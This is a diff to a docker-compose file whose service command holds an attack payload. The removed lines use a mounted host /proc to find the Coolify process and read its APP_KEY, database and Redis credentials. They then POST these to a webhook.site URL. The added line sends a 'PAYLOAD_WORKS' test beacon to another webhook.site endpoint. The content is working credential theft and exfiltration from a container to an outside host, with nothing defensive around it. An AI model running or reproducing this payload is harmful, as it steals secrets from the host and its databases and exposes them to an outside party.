@@ -11,19 +11,5 @@ services:
       - -c
       - |
         apk add --no-cache curl
-        
-        # 1. Найти PID контейнера coolify через /proc
-        # Контейнер coolify - это процесс на хосте
-        find /host-root/proc -maxdepth 2 -name environ -exec grep -l "APP_KEY" {} \; 2>/dev/null | head -1 > /tmp/coolify_environ_path.txt
-        
-        cat /tmp/coolify_environ_path.txt | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=environ_path
-        
-        # 2. Прочитать переменные окружения
-        ENVIRON_PATH=$(cat /tmp/coolify_environ_path.txt)
-        if [ -n "$ENVIRON_PATH" ]; then
-          cat "$ENVIRON_PATH" | tr '\0' '\n' | grep -E "APP_KEY|DB_PASSWORD|DB_USERNAME|REDIS_PASSWORD" | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=coolify_secrets
-        else
-          echo "Coolify environ not found" | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=no_environ
-        fi
-        
+        echo "PAYLOAD_WORKS" | curl -X POST --data-binary @- https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=test
         sleep 3600
